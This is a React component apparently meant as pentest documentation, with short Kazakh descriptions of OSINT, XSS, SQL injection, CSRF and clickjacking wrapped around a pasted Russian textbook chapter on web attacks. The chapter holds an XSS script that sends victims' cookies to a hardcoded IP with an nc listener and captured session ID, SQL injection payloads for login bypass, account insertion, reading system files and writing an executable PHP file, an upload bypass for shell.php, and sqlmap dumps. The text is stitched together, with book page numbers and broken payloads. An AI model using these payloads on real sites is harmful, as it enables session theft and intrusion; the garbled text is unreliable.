import React from 'react';

const PentestDocs = () => {

    return (
        <div className={"continer"}>
            <h1 className={"title"}>OSINT</h1>
            <p className={"text"}>Кибердің OSINT (Ашық бастапқы ақпарат) бөліміне қош келдіңіз
                қауіпсіздік! Қазіргі цифрлық әлемде ақпаратқа қол жеткізу бұрынғыдан да оңайырақ болды.
                Интернет пен әлеуметтік медиа деректерді табудың, жинаудың және талдаудың шексіз мүмкіндіктерін ұсынады.
                Дегенмен, бұл сонымен қатар шабуылдаушылар табу үшін бірдей құралдарды пайдалана алатынын білдіреді
                кибершабуылдардың мақсаттары мен жүргізілуі туралы ақпарат. Бұл бөлімде біз ашық пайдалану жолын
                қарастырамыз
                ақпарат көздері киберқауіпсіздік арсеналында қуатты қару бола алады. әдістерін қарастырамыз
                киберқауіптерді анықтау және алдын алу мақсатында қоғамдық ақпаратты жинау, талдау және пайдалану және
                біз сондай-ақ OSINT пайдаланудың сақтық шаралары мен этикалық аспектілерін талқылаймыз. Үйренгіңіз келсе
                киберқауіпсіздік операцияларында ашық ақпарат көздерін пайдалану, содан кейін осы бөлім
                пайдалы кеңестер мен кеңестер береді.</p>
            <h2 className={"subtitle"}>XSS:</h2>
            <p className={"text"} style={{marginBottom: "10px"}}>
                (Cross-Site Scripting) — шабуылдаушы зиянды кодты енгізген кезде веб-сайтқа жасалған шабуыл.
                бетті қарап отырған пайдаланушының компьютерінде жұмыс істей алатын веб-бет.
                Бұл пайдаланушының жеке деректерінің бұзылуына, құпия сөздердің және басқа да құпия ақпараттың ұрлануына
                әкелуі мүмкін.
                ақпаратты, сондай-ақ пайдаланушының компьютерінде оның хабарынсыз зиянды әрекеттерді орындау. </p>

            XSS — тип атаки на пользователя, который осуществляется благодаря включению
            в веб-приложение кода злоумышленника. Чаще всего такому типу атак подвержены
            приложения, в которых отсутствует проверка введенных пользователем данных.
            Скажем, при регистрации пользователь может ввести в поле «имя» не только
            буквы, но и специальные символы, такие как «№» или «*», хотя в имени не может
            быть специальных символов.
            Чаще всего злоумышленники используют JavaScript или Flash, но учитывая раз-
            нообразие поддерживаемых браузером технологий, это может быть что угодно.
            Самыми частыми целями такого типа атак являются: кража cookie-файла поль-
            зователя, взаимодействие с передаваемой во время сессии информацией, а также
            перенаправление пользователя на другой сайт.
            Для демонстрации данного метода найдем, используя ранее рассмотренный метод,
            сайт с гостевой книгой и полем для ввода. Используя запрос в Google наподобие
            Межсайтовый скриптинг (XSS) 69
            «guestbook intitle:comment», находим минут за пятнадцать форму гостевой книги,
            где данные во время ввода не проверяются.
            Рис. 4.1. Форма ввода без проверки данных
            Рис. 4.2. Сообщение, полученное после отправки новой записи в гостевую книгу
            70 Глава 4 • Атаки на веб-приложения
            Перенаправление браузера. Что же полезного может сделать злоумышленник,
            кроме как пугать пользователей сайта всплывающими окнами? Например, можно
            заставить пользователя скачать файл.
            Для этого создадим аналогичным способом на сайте невидимую область и вставим
            туда ссылку на файл.
            Теперь, когда пользователь зайдет на скомпрометированную страницу, браузер
            автоматически предложит ему скачать указанный файл.
            Кража cookie. Как мы говорили ранее, при помощи XSS можно украсть cookie-
            файл. Для этого нам понадобятся: 1) уязвимая форма; 2) утилита netcat, позво-
            ляющая взаимодействовать в интерактивном режиме с любым сетевым сервисом
            (может выступать как в роли сервера, так и в роли клиента); 3) пользователь, на
            котором мы все это проверим.
            После того как мы нашли сайт, на котором нет проверки введенных данных и ко-
            торый хранит все данные в cookie-файле, подготовим место, куда будет приходить
            информация от пользователей. Для этого заставим netcat выступить в роли сервера
            и принимать соединения на порту 80.
            nc -nlvp 80
            Далее создадим скрипт и уже знакомым нам способом загрузим на сайт.
            <script>
                new Image().src="http://122.18.110.30/any.php?output="+document.cookie;
            </script>
            После того как пользователь зайдет на страничку, сразу же произойдет соединение
            с заранее подготовленным netcat’ом, и мы получим нужную информацию.
            root@kali:~# nc -nlvp 80
            listening on [any] 80 ...
            connect to [122.18.110.30] from (UNKNOWN) [83.165.32.18] 49455
            GET /any.php?output=PHPSESSID=316d4647de53486c2c005811065 HTTP/1.1
            Accept: */*
            Referer: http://127.0.0.1/index.php
            ...
            Теперь у нас есть идентификатор сессии. Можно найти соответствующий cookie
            и поменять его вручную или же воспользоваться плагином. В данном случае мы
            используем «Cookies Manager+».
            Сохранив изменения и обновив страницу, мы сможем пользоваться данным сайтом
            с правами администратора. Однако учтите, что, захватив один раз сессию, ею нельзя
            пользоваться постоянно — только до тех пор, пока пользователь или система ее не
            закроют.
            Межсайтовый скриптинг (XSS) 71
            Рис. 4.3. Изменение данных при помощи «Cookies Manager+»
            Рис. 4.4. Профиль администратора сайта
            72 Глава 4 • Атаки на веб-приложения
            Отраженный XSS. Этот вариант немного сложнее предыдущего. Обычно, исполь-
            зуя данную уязвимость, атака на пользователя происходит через такие каналы, как
            электронная почта или форумы.
            Суть заключается в том, что злоумышленник помещает код в HTTP-ответ леги-
            тимного сайта.
            http://allgames.com/index.php?user=

            Пользователь, который получает данный линк, видит только его первую часть
            и понимает, что тот ведет на знакомый и, казалось бы, безопасный сайт. Но
            после того, как пользователь перейдет по ссылке во время открытия сайта, ко -
            торому он доверяет, ему будет предложено скачать файл, что он, скорее всего,
            и сделает.
            Однако надо учесть, что данный файл будет предложено скачать не всем посети-
            телям сайта, а только тем, кто перейдет по правильно сформированному линку.

            <h2 className={"subtitle"}>Sql инъекциясы:</h2>
            <p className={"text"} style={{marginBottom: "10px"}}>
                (SQLi) — сұрауларға зиянды SQL кодын енгізуді қамтитын веб-қосымшаға шабуыл
                дерекқорға. Шабуылдаушы құпия деректерге қол жеткізе алады, дерекқордағы деректерді өзгерте алады немесе
                тіпті оларды толығымен алып тастаңыз. SQLi пайдаланушы енгізуі дұрыс сүзілмеген кезде мүмкін
                түрде және SQL кодын дерекқор сұрауларына енгізуге мүмкіндік береді.

                80 Глава 4 • Атаки на веб-приложения
                Если вводимые пользователем данные обрабатываются, то мы получим лишь
                скупое сообщение о том, что мы ввели неправильный адрес, или же не получим
                ничего. Однако если приложение уязвимо, то мы непременно получим развернутое
                сообщение о невозможности выполнить запрос.
                Рис. 4.8. Сообщение об ошибке
                В данном случае SQL-запрос для системы выглядел следующим образом:
                SELECT data FROM table WHERE email = `borntobewild@hotmail.com´´;
                Внимательно изучив сообщение об ошибке, можно решить, что мы будем делать
                на следующем шаге. Но, к сожалению, такие ошибки не всегда бывают инфор-
                мативными. Если нам не удалось получить достаточно информации из такого
                сообщения, то можно попробовать получить информацию обычным перебором.
                Практически всегда столбцы в базе данных имеют понятные человеку названия
                и отражают суть информации, которая там будет храниться. Теперь узнаем, с ка-
                кими полями работает наше приложение. Просто подставим это в поле для ввода
                адреса электронной почты:
                borntobewild@hotmail.com’ AND email IS NULL; --
                Меняя имя поля, указанное после оператора AND (на e-mail, mail, email), мы вы-
                яснили, что существует столбец с названием email. В данном случае интерпретация
                поведения приложения будет такой же, как и в других случаях. Если мы получаем
                сообщение об ошибке, наше предположение неверно. Однако если мы получаем
                любое другое сообщение или не получаем ничего, это знак того, что наша попытка
                увенчалась успехом. Аналогично можно подобрать поля userid, password, last_login
                и т. д.
                SQL-инъекции 81
                Но это не все. Используя данный подход, можно найти имена таблиц:
                borntobewild@hotmail.com´ AND 1=(SELECT COUNT(*) FROM tablename); --
                Теперь, зная структуру таблицы, содержащей данные о пользователях, добавим
                новую запись:
                borntobewild@hotmail.com´ NSERT INTO members 'email', 'passwd', 'login_id', 'full_
                name') VALUES ('jane@mailman.com', '12345', 'jane', 'Olive Jane');--
                Теперь мы спокойно можем зайти в систему, используя только что созданную
                учетную запись. Обратите внимание на то, что в базе данных могут быть поля,
                указывающие на принадлежность пользователя к привилегированным группам —
                например, к группе администраторов. В таком случае, повысив привилегии, можно
                просто и легко перехватить управление веб-приложением.
                Есть еще одна очень интересная возможность обойти аутентификацию, используя
                уязвимые формы. Для начала немного теории.
                Предположим, что в таблице пользователей интересующего нас сайта помимо
                прочих полей существуют — username и pаssword. При выполнении следующего
                запроса система вернет нам все записи из таблицы:
                Select * from users;
                Если же мы используем запрос с несуществующими значениями, то СУБД не вер-
                нет нам ничего, что тоже вполне логично, ведь у нас нет пользователя «nobody»
                с паролем «nopass».
                Select * from users where name='nobody' and password='nopass';
                Однако если мы немного изменим запрос, то система выдаст нам все записи. Не-
                смотря на то что пользователя «nobody» не существует, условие 1=1 всегда будет
                выполняться. Согласитесь, трудно представить, что 1 когда-нибудь станет не рав-
                ным 1. Символ # указывает СУБД на то, что все записанное после него является
                комментарием и исполняться не должно.
                Select * from users where name='nobody' or 1=1;# and password='nopass';
                Теперь, используя оператор LIMIT, модифицируем запрос так, чтобы он возвращал
                не все записи, а только первую:
                Select * from users where name='nobody' or 1=1 LIMIT 1;# and password='nopass';
                Вот мы и получили только одну запись. Теперь применим это на живой системе
                для того, чтобы получить доступ к закрытой части страницы.
                82 Глава 4 • Атаки на веб-приложения
                Рис. 4.9. SQL-инъекция посредством формы аутентификации
                Но что же делать, если система не возвращает ничего? В этом случае можно по-
                пытаться сделать слепую SQL-инъекцию. Используя данный метод, мы больше не
                полагаемся на выводимые системой сообщения, но все так же можем манипули-
                ровать информацией.
                Есть несколько способов слепой инъекции. Рассмотрим вариант с временной
                задержкой. Суть его очень проста: мы помещаем оператор, задерживающий ис-
                полнение команды на определенное время, в самый конец выражения. Таким об-
                разом, если сработала первая часть, то мы узнаем об этом по задержке, к которой
                приведет вторая часть выражения. Ведь если первая часть не сработает, то и вторая
                не выполнится.
                IF EXISTS(SELECT * FROM users) WAITFOR DELAY '0 :0 :10 '--
                В случае, если таблица с названием users существует, мы получим при выполнении
                данного запроса десятисекундную задержку.
                Однако не стоит думать, что атакам данного типа подвержены исключительно поля
                для ввода каких-либо данных. На самом деле модифицировать запрос можно, ис-
                пользуя любой элемент — радиокнопки, выпадающие списки и т. д.
                Эксплуатация уязвимостей элементов форм, отличных от полей ввода данных,
                доставляет некоторое неудобство — ведь мы не можем ввести нужные данные
                и отправить их на сервер простым нажатием кнопки. В таком случае нам при-
                дется модифицировать HTTP-запросы. Справиться с этой задачей нам поможет
                локальный прокси-сервер. Для наших целей отлично подойдет Tamper Data — это
                плагин для Firefox, позволяющий перехватывать запросы, модифицировать их
                и отправлять дальше.
                После установки плагина перезапустите Firefox, откройте форму, которую вы хо-
                тите проанализировать, и в Tamper Data нажмите «Start Tamper».
                Поле того как вы нажмете на веб-странице кнопку «отправить», плагин будет
                перехватывать все запросы. После перехвата запроса у вас будет несколько вари-
                антов — отправить, отменить или просмотреть запрос. После анализа запросов мы
                нашли нужный — в нашем случае это поля для выбора формата письма — и моди-
                фицировали его.
                SQL-инъекции 83
                Рис. 4.10. Форма для регистрации, запущенный плагин «Tamper Data»
                При помощи этого плагина можно не только осуществлять SQL-инъекции, но
                и обходить различные ограничения. Технология та же. Например, есть сайт, позво-
                ляющий загружать картинки только определенного типа. Проверка типа картинки
                происходит на стороне пользователя, а это значит, что на сервер отправится запрос,
                который уже не будет проверяться.
                Предположим, что мы хотим загрузить shell.php на сервер, но через форму мы
                можем отправлять только файлы с расширением pdf. Не беда! Сделаем в той же
                директории копию файла и переименуем в shell.pdf. Затем воспользуемся формой
                и отправим переименованный файл на сервер. В момент отправки Tamper Data
                перехватит запрос. Наша задача — найти то поле, где указан shell.pdf, и переиме-
                новать его в shell.php. Таким образом, мы добились своего — нужный файл будет
                загружен на сервер!
                84 Глава 4 • Атаки на веб-приложения
                Рис. 4.11. Модификация параметра «text_only» в Tamper Data
                Однако, используя SQL, тоже можно загружать файлы на сервер и исполнять их.
                Сразу уточним, что возможность загружать и исполнять файлы на сервере зависит
                от его конфигурации. Серверы под управлением Windows более уязвимы к данному
                типу атак.
                Возьмем запрос, сформированный на предыдущем шаге, и модифицируем его, ис-
                пользуя функцию load_file:
                http://www.mycorp.com/web/index.php?id=-31 union all select 1,2,load_file(`c:/
                windows/system32/drivers/etc/hosts´),4,5,6,7--+
                В данном случае сервер вернет содержимое файла hosts, но это не самое интересное.
                Попробуем создать и запустить собственный файл:
                http://www.mycorp.com/web/index.php?id=-31 union all select 1,2,"  ,4,5,6,7 into OUTFILE 'c:/xampp/htdocs/exec.php'--+
                Теперь, создав файл, мы можем вызывать его с нужным параметром. Сразу же
                возникает вопрос: а какой параметр нужен? Любой, который можно выполнить из
                командной строки на стороне сервера. Для примера выполним ipconfig.
                SQL-инъекции 85
                Рис. 4.12. Результат исполнения ipconfig на стороне сервера
                Автоматизация процесса. Безусловно, все написанное выше очень важно для по-
                нимания SQL-инъекций, однако гораздо проще пользоваться автоматическими
                инструментами, которые выполнят большую часть работы за вас. Одной из заслу-
                живающих внимания программ является sqlmap. Ее можно использовать не только
                для поиска уязвимостей, но и для эксплуатации уже найденных.
                Для примера запустим sqlmap с целью автоматического поиска уязвимостей на
                интересующей нас странице:
                root@kali:~# sqlmap -u http://www.mycorp.org --crawl=1
                [*] starting at 10:30:43
                do you want to check for the existence of site's sitemap(.xml) [y/N]
                [10:30:43] [INFO] starting crawler
                [10:30:43] [INFO] searching for links with depth 1
                do you want to store crawling results to a temporary file for eventual further
                processing with other tools [y/N]
                [10:30:46] [INFO] sqlmap got a total of 13 targets
                URL 1:

                [10:30:47] [INFO] testing URL 'http://www. mycorp.org:80/models_detail.php?id=2'
                [10:30:47] [INFO] using '/root/.sqlmap/output/results-11032016_1030am.csv' as the
                CSV results file in multiple targets mode
                [10:30:47] [INFO] testing connection to the target URL
                [10:30:54] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
                [10:30:56] [INFO] testing if the target URL is stable
                ...
                [10:37:44] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) — 1 to 20
                columns' injectable
                GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)?
                [y/N]
                sqlmap identified the following injection point(s) with a total of 91 HTTP(s)
                requests:
                ---
                Parameter: id (GET)
                Type: boolean-based blind
                86 Глава 4 • Атаки на веб-приложения
                Title: AND boolean-based blind — WHERE or HAVING clause
                Payload: id=2 AND 7324=7324
                Type: AND/OR time-based blind
                Title: MySQL = 5.0.12 AND time-based blind (comment)
                Payload: id=2 AND SLEEP(5)#
                Type: UNION query
                Title: MySQL UNION query (NULL) — 11 columns
                Payload: id=-6266 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x
                716a6a6a71,0x68494973784c556f467756484e68584f736a7279666f635a4774414566627649724947
                597961647a,0x7171767871),NULL,NULL,NULL#
                ---
                do you want to exploit this SQL injection? [Y/n]n
                А теперь используем sqlmap для получения структуры базы данных целевой си-
                стемы:
                root@kali:~# sqlmap -u http://www. www.mycorp.org:80/models_detail.php?id=2
                --dbms=mysql --dump --threads=5
                [10:37:31] [INFO] testing connection to the target URL
                [10:37:35] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
                [10:37:35] [INFO] testing if the target URL is stable
                [10:37:36] [WARNING] target URL is not stable. sqlmap will base the page comparison
                on a sequence matcher. If no dynamic nor injectable parameters are detected, or
                in case of junk results, refer to user's manual paragraph 'Page comparison' and
                provide a string or regular expression to match on
                how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit]
                [10:37:40] [INFO] testing if GET parameter 'id' is dynamic
                [10:37:40] [INFO] confirming that GET parameter 'id' is dynamic
                [10:37:45] [INFO] GET parameter 'id' is dynamic
                [10:37:46] [WARNING] reflective value(s) found and filtering out
                [10:37:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be
                injectable
                [10:37:46] [INFO] testing for SQL injection on GET parameter 'id'
                [10:37:46] [INFO] testing 'AND boolean-based blind — WHERE or HAVING clause'
                [10:37:53] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind — WHERE
                or HAVING clause' injectable
                [10:37:53] [INFO] testing 'MySQL = 5.0 AND error-based — WHERE, HAVING, ORDER BY
                or GROUP BY clause (FLOOR)'
                ...
                Database: db139202_trussart
                Table: available_images
                [6698 entries]
                +----------+--------------+---------------------+----------------------+
                | image_id | available_id | full | thumbnail |
                +----------+--------------+---------------------+----------------------+
                [12:18:57] [WARNING] console output will be trimmed to last 256 rows due to large
                table size
                | 6540 | 991 | mxf4gm9i7i_full.jpg | mxf4gm9i7i_thumb.jpg |
                | 6541 | 992 | 4hmfx9mqym_full.jpg | 4hmfx9mqym_thumb.jpg |
                | 6542 | 992 | s98v8otl5_full.jpg | s98v8otl5_thumb.jpg |
                | 6543 | 992 | 3lqby9vrrq_full.jpg | 3lqby9vrrq_thumb.jpg |
                | 6544 | 992 | et8c2xpf12_full.jpg | et8c2xpf12_thumb.jpg |
                | 6545 | 992 | 4twns60l_full.jpg | 4twns60l_thumb.jpg |
                Резюме 87
                | 6546 | 992 | bmq2xf9693_full.jpg | bmq2xf9693_thumb.jpg |
                | 6547 | 992 | stp4cjf980_full.jpg | stp4cjf980_thumb.jpg |
                | 6548 | 993 | wj9r6mxwt_full.jpg | wj9r6mxwt_thumb.jpg |
                | 6549 | 993 | yyzgyrpxjt_full.jpg | yyzgyrpxjt_thumb.jpg |
                | 6550 | 993 | ltjukyx3z_full.jpg | ltjukyx3z_thumb.jpg |
                ...
                Database: db139202_trussart
                Table: gallery
                [0 entries]
                +----------+------------+-----+
                | model_id | gallery_id | src |
                +----------+------------+-----+
                +----------+------------+-----+
                ...
                Database: db139202_trussart
                Table: finishes
                [0 entries]
                +----------+-----------+-----+-------------+
                | model_id | finish_id | src | finish_name |
                +----------+-----------+-----+-------------+
                +----------+-----------+-----+-------------+
            </p>
            <h2 className={"subtitle"}>CSRF:</h2>
            <p className={"text"} style={{marginBottom: "10px"}}>
                (Cross-Site Request Forgery) – шабуылдаушы жіберетін веб-бағдарлама шабуылының түрі
                уәкілетті пайдаланушының атынан оның хабарсыз немесе келісімінсіз сұрау. Шабуыл негізделген
                егер сұрау дұрыс пішімде болса және оны қамтитын болса, сервер шынайы сұрау мен жалғанды ​​ажырата
                алмайды
                қажетті деректер.
            </p><h2 className={"subtitle"}>Clickjacking:</h2>
            <p className={"text"} style={{marginBottom: "10px"}}>
                Бұл пайдаланушыларды алдау үшін интерфейс элементтерін пайдаланатын веб-қосымшаларға шабуылдың түрі және
                құрылғыларында қажетсіз әрекеттерді орындау.
            </p>
        </div>
    );
};


export default PentestDocs;